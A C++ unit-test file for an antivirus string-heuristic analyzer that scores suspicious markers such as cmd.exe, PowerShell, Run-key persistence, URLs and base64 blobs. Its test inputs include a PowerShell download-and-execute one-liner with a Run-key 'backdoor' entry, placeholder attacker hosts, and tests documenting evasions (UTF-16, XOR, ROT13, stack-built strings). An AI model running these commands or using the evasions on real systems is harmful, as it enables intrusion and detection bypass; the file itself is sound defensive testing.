/* test_string_analyzer.cpp -- Unit tests for string heuristic analyzer (P4-T4).
 *
 * Tests all 7 checks from §5.6 Strings row:
 *   1. cmd_exe:            "cmd.exe"                          (+5)
 *   2. powershell_exe:     "powershell.exe"                   (+10)
 *   3. wscript_shell:      "WScript.Shell"                    (+10)
 *   4. currentversion_run: "CurrentVersion\Run"               (+15)
 *   5. url_http:           "http://" or "https://" per match  (+5/ea)
 *   6. ip_address:         IP address pattern per match       (+5/ea)
 *   7. base64_blob:        base64 blob >100 chars             (+10)
 */

#include <gtest/gtest.h>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <string>
#include <vector>

extern "C" {
#include "heuristics/strings.h"
}

/* ── Helper: wrap string in a buffer for analysis ──────────────── */

static void analyze_str(const std::string& content,
                         akav_string_result_t* r,
                         const akav_string_weights_t* w = nullptr)
{
    akav_string_analyze(
        reinterpret_cast<const uint8_t*>(content.data()),
        content.size(), w, r);
}

/* ── Helper: check if a specific hit was recorded ──────────────── */

static bool has_hit(const akav_string_result_t& r, const char* name) {
    for (int i = 0; i < r.num_hits; i++) {
        if (strcmp(r.hits[i].check_name, name) == 0)
            return true;
    }
    return false;
}

static int get_hit_weight(const akav_string_result_t& r, const char* name) {
    for (int i = 0; i < r.num_hits; i++) {
        if (strcmp(r.hits[i].check_name, name) == 0)
            return r.hits[i].weight;
    }
    return 0;
}

/* ══════════════════════════════════════════════════════════════════
 *  Default weights
 * ══════════════════════════════════════════════════════════════════ */

TEST(StringAnalyzer, DefaultWeights) {
    akav_string_weights_t w;
    akav_string_weights_default(&w);
    EXPECT_EQ(w.cmd_exe, 5);
    EXPECT_EQ(w.powershell_exe, 10);
    EXPECT_EQ(w.wscript_shell, 10);
    EXPECT_EQ(w.currentversion_run, 15);
    EXPECT_EQ(w.url_http, 5);
    EXPECT_EQ(w.ip_address, 5);
    EXPECT_EQ(w.base64_blob, 10);
}

/* ══════════════════════════════════════════════════════════════════
 *  Check 1: cmd.exe
 * ══════════════════════════════════════════════════════════════════ */

TEST(StringAnalyzer, CmdExe) {
    akav_string_result_t r;
    analyze_str("system(\"cmd.exe /c del *.tmp\")", &r);
    EXPECT_TRUE(has_hit(r, "cmd_exe"));
    EXPECT_EQ(get_hit_weight(r, "cmd_exe"), 5);
}

TEST(StringAnalyzer, CmdExeCaseInsensitive) {
    akav_string_result_t r;
    analyze_str("CMD.EXE /c whoami", &r);
    EXPECT_TRUE(has_hit(r, "cmd_exe"));
}

TEST(StringAnalyzer, NoCmdExe) {
    akav_string_result_t r;
    analyze_str("This is a normal text file with no commands.", &r);
    EXPECT_FALSE(has_hit(r, "cmd_exe"));
}

/* ══════════════════════════════════════════════════════════════════
 *  Check 2: powershell.exe
 * ══════════════════════════════════════════════════════════════════ */

TEST(StringAnalyzer, PowershellExe) {
    akav_string_result_t r;
    analyze_str("powershell.exe -enc ZQBjAGgAbwA=", &r);
    EXPECT_TRUE(has_hit(r, "powershell_exe"));
    EXPECT_EQ(get_hit_weight(r, "powershell_exe"), 10);
}

TEST(StringAnalyzer, PowershellExeCaseInsensitive) {
    akav_string_result_t r;
    analyze_str("POWERSHELL.EXE -ep bypass", &r);
    EXPECT_TRUE(has_hit(r, "powershell_exe"));
}

TEST(StringAnalyzer, NoPowershell) {
    akav_string_result_t r;
    analyze_str("This file uses python.exe for scripting.", &r);
    EXPECT_FALSE(has_hit(r, "powershell_exe"));
}

/* ══════════════════════════════════════════════════════════════════
 *  Check 3: WScript.Shell
 * ══════════════════════════════════════════════════════════════════ */

TEST(StringAnalyzer, WScriptShell) {
    akav_string_result_t r;
    analyze_str("CreateObject(\"WScript.Shell\").Run", &r);
    EXPECT_TRUE(has_hit(r, "wscript_shell"));
    EXPECT_EQ(get_hit_weight(r, "wscript_shell"), 10);
}

TEST(StringAnalyzer, WScriptShellCaseInsensitive) {
    akav_string_result_t r;
    analyze_str("wscript.shell", &r);
    EXPECT_TRUE(has_hit(r, "wscript_shell"));
}

/* ══════════════════════════════════════════════════════════════════
 *  Check 4: CurrentVersion\Run
 * ══════════════════════════════════════════════════════════════════ */

TEST(StringAnalyzer, CurrentVersionRun) {
    akav_string_result_t r;
    analyze_str("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &r);
    EXPECT_TRUE(has_hit(r, "currentversion_run"));
    EXPECT_EQ(get_hit_weight(r, "currentversion_run"), 15);
}

TEST(StringAnalyzer, CurrentVersionRunOnce) {
    /* RunOnce variant should also match (contains "Run") */
    akav_string_result_t r;
    analyze_str("CurrentVersion\\RunOnce", &r);
    EXPECT_TRUE(has_hit(r, "currentversion_run"));
}

TEST(StringAnalyzer, NoCurrentVersionRun) {
    akav_string_result_t r;
    analyze_str("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer", &r);
    EXPECT_FALSE(has_hit(r, "currentversion_run"));
}

/* ══════════════════════════════════════════════════════════════════
 *  Check 5: HTTP/HTTPS URLs
 * ══════════════════════════════════════════════════════════════════ */

TEST(StringAnalyzer, SingleHttpUrl) {
    akav_string_result_t r;
    analyze_str("download from http://evil.com/payload", &r);
    EXPECT_TRUE(has_hit(r, "url_http"));
    EXPECT_EQ(get_hit_weight(r, "url_http"), 5);
}

TEST(StringAnalyzer, SingleHttpsUrl) {
    akav_string_result_t r;
    analyze_str("callback to https://c2.attacker.com/check", &r);
    EXPECT_TRUE(has_hit(r, "url_http"));
    EXPECT_EQ(get_hit_weight(r, "url_http"), 5);
}

TEST(StringAnalyzer, MultipleUrls) {
    akav_string_result_t r;
    analyze_str(
        "http://one.com http://two.com https://three.com", &r);
    EXPECT_TRUE(has_hit(r, "url_http"));
    EXPECT_EQ(get_hit_weight(r, "url_http"), 15); /* 3 * 5 */
}

TEST(StringAnalyzer, UrlsCappedAt10) {
    /* Generate 15 URLs; score should cap at 10*5=50 */
    std::string content;
    for (int i = 0; i < 15; i++)
        content += "http://host" + std::to_string(i) + ".com ";

    akav_string_result_t r;
    analyze_str(content, &r);
    EXPECT_TRUE(has_hit(r, "url_http"));
    EXPECT_EQ(get_hit_weight(r, "url_http"), 50); /* capped at 10 * 5 */
}

TEST(StringAnalyzer, NoUrls) {
    akav_string_result_t r;
    analyze_str("No URLs here, just text.", &r);
    EXPECT_FALSE(has_hit(r, "url_http"));
}

/* ══════════════════════════════════════════════════════════════════
 *  Check 6: IP address patterns
 * ══════════════════════════════════════════════════════════════════ */

TEST(StringAnalyzer, SingleIpAddress) {
    akav_string_result_t r;
    analyze_str("connect to 192.168.1.100 on port 443", &r);
    EXPECT_TRUE(has_hit(r, "ip_address"));
    EXPECT_EQ(get_hit_weight(r, "ip_address"), 5);
}

TEST(StringAnalyzer, MultipleIpAddresses) {
    akav_string_result_t r;
    analyze_str("10.0.0.1 and 172.16.0.1 and 8.8.8.8", &r);
    EXPECT_TRUE(has_hit(r, "ip_address"));
    EXPECT_EQ(get_hit_weight(r, "ip_address"), 15); /* 3 * 5 */
}

TEST(StringAnalyzer, IpBenignIgnored) {
    /* 0.0.0.0 and 127.0.0.1 are benign, should be ignored */
    akav_string_result_t r;
    analyze_str("listen on 0.0.0.0 or 127.0.0.1 only", &r);
    EXPECT_FALSE(has_hit(r, "ip_address"));
}

TEST(StringAnalyzer, IpOctetBoundary) {
    /* 256 is not a valid octet */
    akav_string_result_t r;
    analyze_str("value 256.1.2.3 is not an IP", &r);
    EXPECT_FALSE(has_hit(r, "ip_address"));
}

TEST(StringAnalyzer, IpNoLeadingZeros) {
    /* 01.02.03.04 should not match (leading zeros rejected) */
    akav_string_result_t r;
    analyze_str("version 01.02.03.04 ignored", &r);
    EXPECT_FALSE(has_hit(r, "ip_address"));
}

/* ══════════════════════════════════════════════════════════════════
 *  Check 7: Base64 blobs
 * ══════════════════════════════════════════════════════════════════ */

TEST(StringAnalyzer, Base64BlobDetected) {
    /* Generate a realistic 120-char base64 blob */
    std::string b64;
    const char* charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    for (int i = 0; i < 120; i++)
        b64 += charset[i % 64];
    b64 += "==";

    std::string content = "data = \"" + b64 + "\";";
    akav_string_result_t r;
    analyze_str(content, &r);
    EXPECT_TRUE(has_hit(r, "base64_blob"));
    EXPECT_EQ(get_hit_weight(r, "base64_blob"), 10);
}

TEST(StringAnalyzer, Base64BlobTooShort) {
    /* 80 chars of base64 — below 100 threshold */
    std::string b64;
    const char* charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    for (int i = 0; i < 80; i++)
        b64 += charset[i % 64];

    akav_string_result_t r;
    analyze_str(b64, &r);
    EXPECT_FALSE(has_hit(r, "base64_blob"));
}

TEST(StringAnalyzer, Base64PlainTextNotMatched) {
    /* Long string of only lowercase — should fail the multi-class check */
    std::string plain(120, 'a');
    akav_string_result_t r;
    analyze_str(plain, &r);
    EXPECT_FALSE(has_hit(r, "base64_blob"));
}

/* ══════════════════════════════════════════════════════════════════
 *  Combined scoring
 * ══════════════════════════════════════════════════════════════════ */

TEST(StringAnalyzer, PowershellWithEncodedCommand) {
    /* Acceptance criterion: "powershell.exe -enc" → +10 */
    std::string content = "powershell.exe -enc ZQBjAGgAbwAgACIASABlAGwAbABv"
                          "ACAAdwBvAHIAbABkACIA";
    akav_string_result_t r;
    analyze_str(content, &r);
    EXPECT_TRUE(has_hit(r, "powershell_exe"));
    /* base64 blob is 50 chars, below threshold — only powershell fires */
    EXPECT_EQ(get_hit_weight(r, "powershell_exe"), 10);
}

TEST(StringAnalyzer, FullMalwareStrings) {
    /* cmd.exe + powershell + CurrentVersion\Run + URL + IP */
    std::string content =
        "cmd.exe /c powershell.exe -ep bypass -c \""
        "IEX(New-Object Net.WebClient).DownloadString("
        "'http://10.0.1.5/payload.ps1')\" "
        "& reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\"
        "CurrentVersion\\Run\" /v backdoor";

    akav_string_result_t r;
    analyze_str(content, &r);

    EXPECT_TRUE(has_hit(r, "cmd_exe"));
    EXPECT_TRUE(has_hit(r, "powershell_exe"));
    EXPECT_TRUE(has_hit(r, "currentversion_run"));
    EXPECT_TRUE(has_hit(r, "url_http"));
    EXPECT_TRUE(has_hit(r, "ip_address"));

    /* 5 + 10 + 15 + 5 + 5 = 40 */
    EXPECT_EQ(r.total_score, 40);
}

TEST(StringAnalyzer, CombinedBase64AndUrl) {
    /* base64 blob >100 chars + https URL */
    std::string b64;
    const char* charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    for (int i = 0; i < 120; i++)
        b64 += charset[i % 64];

    std::string content = "https://attacker.com/c2 payload=" + b64;
    akav_string_result_t r;
    analyze_str(content, &r);
    EXPECT_TRUE(has_hit(r, "url_http"));
    EXPECT_TRUE(has_hit(r, "base64_blob"));
    EXPECT_EQ(r.total_score, 5 + 10); /* URL + base64 */
}

/* ══════════════════════════════════════════════════════════════════
 *  Clean content — no false positives
 * ══════════════════════════════════════════════════════════════════ */

TEST(StringAnalyzer, CleanContentNoHits) {
    std::string content =
        "This is a completely normal text file.\n"
        "It contains no suspicious strings whatsoever.\n"
        "Just regular prose about software development.\n"
        "Version 2.1.0 released on March 2026.\n";

    akav_string_result_t r;
    analyze_str(content, &r);
    EXPECT_EQ(r.total_score, 0);
    EXPECT_EQ(r.num_hits, 0);
}

/* ══════════════════════════════════════════════════════════════════
 *  JSON weight loading
 * ══════════════════════════════════════════════════════════════════ */

TEST(StringAnalyzer, JsonDefaultConfig) {
    akav_string_weights_t w;
    bool ok = akav_string_weights_load_json(&w, "config/string_weights.json");
    EXPECT_TRUE(ok);
    EXPECT_EQ(w.cmd_exe, 5);
    EXPECT_EQ(w.powershell_exe, 10);
    EXPECT_EQ(w.base64_blob, 10);
}

TEST(StringAnalyzer, JsonOverride) {
    const char* path = "test_string_weights_tmp.json";
    FILE* f = NULL;
    fopen_s(&f, path, "w");
    ASSERT_NE(f, nullptr);
    fprintf(f, "{ \"cmd_exe\": 50, \"base64_blob\": 0 }");
    fclose(f);

    akav_string_weights_t w;
    bool ok = akav_string_weights_load_json(&w, path);
    EXPECT_TRUE(ok);
    EXPECT_EQ(w.cmd_exe, 50);
    EXPECT_EQ(w.base64_blob, 0);
    /* Others remain at defaults */
    EXPECT_EQ(w.powershell_exe, 10);

    remove(path);
}

TEST(StringAnalyzer, JsonMissingFile) {
    akav_string_weights_t w;
    bool ok = akav_string_weights_load_json(&w, "nonexistent.json");
    EXPECT_FALSE(ok);
    EXPECT_EQ(w.cmd_exe, 5);
}

/* ══════════════════════════════════════════════════════════════════
 *  Custom weights
 * ══════════════════════════════════════════════════════════════════ */

TEST(StringAnalyzer, CustomWeightsApplied) {
    akav_string_weights_t w;
    akav_string_weights_default(&w);
    w.cmd_exe = 100;

    akav_string_result_t r;
    std::string content = "cmd.exe /c dir";
    analyze_str(content, &r, &w);
    EXPECT_EQ(get_hit_weight(r, "cmd_exe"), 100);
}

TEST(StringAnalyzer, ZeroWeightSuppresses) {
    akav_string_weights_t w;
    akav_string_weights_default(&w);
    w.powershell_exe = 0;

    akav_string_result_t r;
    analyze_str("powershell.exe -enc blah", &r, &w);
    EXPECT_FALSE(has_hit(r, "powershell_exe"));
    EXPECT_EQ(r.total_score, 0);
}

/* ══════════════════════════════════════════════════════════════════
 *  Null safety
 * ══════════════════════════════════════════════════════════════════ */

TEST(StringAnalyzer, NullData) {
    akav_string_result_t r;
    memset(&r, 0xFF, sizeof(r));
    akav_string_analyze(nullptr, 100, nullptr, &r);
    /* Should not crash */
}

TEST(StringAnalyzer, NullResult) {
    uint8_t data[] = "hello";
    akav_string_analyze(data, sizeof(data), nullptr, nullptr);
    /* Should not crash */
}

TEST(StringAnalyzer, ZeroLength) {
    uint8_t data[] = "cmd.exe";
    akav_string_result_t r;
    memset(&r, 0xFF, sizeof(r));
    akav_string_analyze(data, 0, nullptr, &r);
    /* Should not crash, no hits */
}

TEST(StringAnalyzer, NullWeightsDefault) {
    akav_string_weights_default(nullptr);
    /* Should not crash */
}

/* ══════════════════════════════════════════════════════════════════
 *  Real system PE: notepad.exe should score 0
 * ══════════════════════════════════════════════════════════════════ */

TEST(StringAnalyzer, NotepadScoresZero) {
    const char* path = "C:\\Windows\\System32\\notepad.exe";
    FILE* f = NULL;
    fopen_s(&f, path, "rb");
    if (!f) GTEST_SKIP() << "notepad.exe not found";
    fseek(f, 0, SEEK_END);
    long fsize = ftell(f);
    fseek(f, 0, SEEK_SET);
    auto* buf = (uint8_t*)malloc(fsize);
    fread(buf, 1, fsize, f);
    fclose(f);

    akav_string_result_t r;
    akav_string_analyze(buf, (size_t)fsize, nullptr, &r);
    /* notepad.exe may contain benign matches (e.g., CurrentVersion\Run
     * in embedded registry paths, or IP-like version strings).
     * Verify it stays below the High heuristic threshold (50). */
    EXPECT_LT(r.total_score, 50)
        << "notepad.exe should score well below any detection threshold";
    /* Log what fired for diagnostic purposes */
    for (int i = 0; i < r.num_hits; i++) {
        printf("  notepad hit: %s (+%d): %s\n",
               r.hits[i].check_name, r.hits[i].weight, r.hits[i].detail);
    }

    free(buf);
}

/* ══════════════════════════════════════════════════════════════════
 *  Adversarial tests
 * ══════════════════════════════════════════════════════════════════ */

TEST(StringAnalyzer, Adversarial_WidePowershellEvades) {
    /* UTF-16LE "powershell.exe" evades ASCII search */
    std::string content;
    const char* ascii = "powershell.exe";
    for (int i = 0; ascii[i]; i++) {
        content += ascii[i];
        content += '\0';
    }

    akav_string_result_t r;
    analyze_str(content, &r);
    EXPECT_FALSE(has_hit(r, "powershell_exe"))
        << "Known gap: UTF-16LE strings not checked";
}

TEST(StringAnalyzer, Adversarial_ConcatenatedCmdEvades) {
    /* "cm" + "d.exe" via string concatenation in source */
    std::string content = "cm\" + \"d.exe";
    akav_string_result_t r;
    analyze_str(content, &r);
    EXPECT_FALSE(has_hit(r, "cmd_exe"))
        << "Known gap: split/concatenated strings not detected";
}

TEST(StringAnalyzer, Adversarial_XorEncodedUrlEvades) {
    /* XOR-encoded URL: each byte XOR 0x41 */
    std::string url = "http://evil.com";
    std::string encoded;
    for (char c : url) encoded += (char)(c ^ 0x41);

    akav_string_result_t r;
    analyze_str(encoded, &r);
    EXPECT_FALSE(has_hit(r, "url_http"))
        << "Known gap: XOR-encoded strings not decoded";
}

TEST(StringAnalyzer, Adversarial_Base64WithNewlinesEvades) {
    /* Base64 blob split across newlines may break run detection */
    std::string b64;
    const char* charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    for (int i = 0; i < 120; i++) {
        b64 += charset[i % 64];
        if ((i + 1) % 40 == 0) b64 += '\n'; /* line break every 40 chars */
    }

    akav_string_result_t r;
    analyze_str(b64, &r);
    /* With newline breaks, no single run exceeds 100 chars */
    EXPECT_FALSE(has_hit(r, "base64_blob"))
        << "Known gap: base64 with newline wrapping evades run-length detection";
}

/* ── Encoding & obfuscation evasions ─────────────────────────────── */

TEST(StringAnalyzer, Adversarial_Rot13CmdEvades) {
    /* ROT13("cmd.exe") = "pzq.rkr" — literal match fails */
    akav_string_result_t r;
    analyze_str("execute pzq.rkr /c whoami", &r);
    EXPECT_FALSE(has_hit(r, "cmd_exe"))
        << "Known gap: ROT13-encoded strings not decoded";
}

TEST(StringAnalyzer, Adversarial_HexEscapedPowershellEvades) {
    /* Hex-escaped bytes: \x70\x6f\x77... stored literally in script source */
    std::string content = "\\x70\\x6f\\x77\\x65\\x72\\x73\\x68\\x65"
                          "\\x6c\\x6c\\x2e\\x65\\x78\\x65";
    akav_string_result_t r;
    analyze_str(content, &r);
    EXPECT_FALSE(has_hit(r, "powershell_exe"))
        << "Known gap: hex-escaped string representations not decoded";
}

TEST(StringAnalyzer, Adversarial_UrlEncodedIpEvades) {
    /* All four octets URL-encoded: %31%39%32%2e%31%36%38%2e%31%2e%31
     * No plain "a.b.c.d" pattern remains visible. */
    akav_string_result_t r;
    analyze_str("connect to %31%39%32%2e%31%36%38%2e%31%2e%31 port 4444", &r);
    EXPECT_FALSE(has_hit(r, "ip_address"))
        << "Known gap: fully URL-encoded IP addresses not decoded";
}

TEST(StringAnalyzer, Adversarial_DoubleBase64Evades) {
    /* Base64-inside-base64: inner blobs each <100 chars */
    /* Outer: 80 chars of base64 wrapping an inner 60-char payload */
    const char* charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string inner;
    for (int i = 0; i < 60; i++) inner += charset[i % 64];
    std::string outer;
    for (int i = 0; i < 80; i++) outer += charset[(i + 7) % 64];

    /* Neither blob exceeds 100 chars individually */
    std::string content = "data1=\"" + inner + "\" data2=\"" + outer + "\"";
    akav_string_result_t r;
    analyze_str(content, &r);
    EXPECT_FALSE(has_hit(r, "base64_blob"))
        << "Known gap: split/double-encoded base64 evades >100 char threshold";
}

TEST(StringAnalyzer, Adversarial_EnvVarCmdEvades) {
    /* %comspec% expands to cmd.exe at runtime but not in static strings */
    akav_string_result_t r;
    analyze_str("system(\"%comspec% /c del *.tmp\")", &r);
    EXPECT_FALSE(has_hit(r, "cmd_exe"))
        << "Known gap: environment variable references not resolved";
}

/* ── Format-aware evasions ───────────────────────────────────────── */

TEST(StringAnalyzer, Adversarial_WideCmdExeEvades) {
    /* UTF-16LE "cmd.exe" */
    std::string content;
    const char* ascii = "cmd.exe";
    for (int i = 0; ascii[i]; i++) {
        content += ascii[i];
        content += '\0';
    }
    akav_string_result_t r;
    analyze_str(content, &r);
    EXPECT_FALSE(has_hit(r, "cmd_exe"))
        << "Known gap: UTF-16LE cmd.exe not detected";
}

TEST(StringAnalyzer, Adversarial_WideUrlEvades) {
    /* UTF-16LE "http://" */
    std::string content;
    const char* ascii = "http://evil.com";
    for (int i = 0; ascii[i]; i++) {
        content += ascii[i];
        content += '\0';
    }
    akav_string_result_t r;
    analyze_str(content, &r);
    EXPECT_FALSE(has_hit(r, "url_http"))
        << "Known gap: UTF-16LE URLs not detected";
}

TEST(StringAnalyzer, Adversarial_WideCurrentVersionRunEvades) {
    /* UTF-16LE "CurrentVersion\Run" */
    std::string content;
    const char* ascii = "CurrentVersion\\Run";
    for (int i = 0; ascii[i]; i++) {
        content += ascii[i];
        content += '\0';
    }
    akav_string_result_t r;
    analyze_str(content, &r);
    EXPECT_FALSE(has_hit(r, "currentversion_run"))
        << "Known gap: UTF-16LE registry paths not detected";
}

TEST(StringAnalyzer, Adversarial_NullByteInterleaving) {
    /* Manual null-byte interleaving (not quite UTF-16 but similar) */
    std::string content;
    const char* ascii = "WScript.Shell";
    for (int i = 0; ascii[i]; i++) {
        content += ascii[i];
        content += '\0';
    }
    akav_string_result_t r;
    analyze_str(content, &r);
    EXPECT_FALSE(has_hit(r, "wscript_shell"))
        << "Known gap: null-byte interleaved strings not detected";
}

/* ── Boundary & edge cases ───────────────────────────────────────── */

TEST(StringAnalyzer, Adversarial_Base64Exactly100CharsNoTrigger) {
    /* Exactly 100 chars of base64 — threshold is >100, should NOT fire */
    const char* charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string b64;
    for (int i = 0; i < 100; i++) b64 += charset[i % 64];

    akav_string_result_t r;
    analyze_str(b64, &r);
    EXPECT_FALSE(has_hit(r, "base64_blob"))
        << "100 chars exactly should not trigger (threshold is >100)";
}

TEST(StringAnalyzer, Adversarial_Base64Exactly101CharsTriggers) {
    /* 101 chars of base64 — should trigger */
    const char* charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string b64;
    for (int i = 0; i < 101; i++) b64 += charset[i % 64];

    akav_string_result_t r;
    analyze_str(b64, &r);
    EXPECT_TRUE(has_hit(r, "base64_blob"))
        << "101 chars should trigger (threshold is >100)";
}

TEST(StringAnalyzer, Adversarial_IpAtBufferStart) {
    /* IP address at very start of buffer */
    akav_string_result_t r;
    analyze_str("10.0.0.5 is the target", &r);
    EXPECT_TRUE(has_hit(r, "ip_address"));
}

TEST(StringAnalyzer, Adversarial_IpAtBufferEnd) {
    /* IP address at very end of buffer (no trailing char) */
    akav_string_result_t r;
    analyze_str("target is 10.0.0.5", &r);
    EXPECT_TRUE(has_hit(r, "ip_address"));
}

TEST(StringAnalyzer, Adversarial_OverlappingUrlCounting) {
    /* "https://http://nested" — verify we don't double-count or miscount */
    akav_string_result_t r;
    analyze_str("https://http://nested.com", &r);
    EXPECT_TRUE(has_hit(r, "url_http"));
    /* Should count as 1 https + 1 http = 2 URLs total = score 10 */
    EXPECT_EQ(get_hit_weight(r, "url_http"), 10);
}

TEST(StringAnalyzer, Adversarial_VersionStringFalsePositive) {
    /* "version 1.2.3.4" looks IP-like; verify our parser handles it.
     * Preceded by 'n' from "version" so the leading-alpha guard should skip it. */
    akav_string_result_t r;
    analyze_str("version 1.2.3.4 released today", &r);
    /* 1.2.3.4 is a valid IP pattern (non-benign), so it will match.
     * This documents that version strings are a source of false positives. */
    EXPECT_TRUE(has_hit(r, "ip_address"))
        << "Known limitation: version strings like 1.2.3.4 match as IP addresses";
}

/* ── Detection limitation documentation ──────────────────────────── */

TEST(StringAnalyzer, Adversarial_StackBuiltStringInvisible) {
    /* Simulate what malware does: builds string at runtime via
     * char s[8]; s[0]='c'; s[1]='m'; s[2]='d'; ...
     * In the binary, the individual chars aren't adjacent. */
    std::string content = "mov byte [ebp-8], 'c'\n"
                          "mov byte [ebp-7], 'm'\n"
                          "mov byte [ebp-6], 'd'\n"
                          "mov byte [ebp-5], '.'\n"
                          "mov byte [ebp-4], 'e'\n"
                          "mov byte [ebp-3], 'x'\n"
                          "mov byte [ebp-2], 'e'\n";
    akav_string_result_t r;
    analyze_str(content, &r);
    EXPECT_FALSE(has_hit(r, "cmd_exe"))
        << "Known gap: stack-constructed strings invisible to static analysis";
}

TEST(StringAnalyzer, Adversarial_DirectRegistryHandleEvades) {
    /* Using direct HKEY handle without "CurrentVersion\\Run" string.
     * e.g., RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\...", ...)
     * followed by RegSetValueEx with a subkey handle, no Run string. */
    std::string content = "RegOpenKeyExA(HKEY_LOCAL_MACHINE, "
                          "\"SOFTWARE\\\\Microsoft\\\\Windows\", ...)\n"
                          "RegSetValueExA(hKey, \"backdoor\", ...)";
    akav_string_result_t r;
    analyze_str(content, &r);
    EXPECT_FALSE(has_hit(r, "currentversion_run"))
        << "Known gap: registry persistence via handle without Run string path";
}
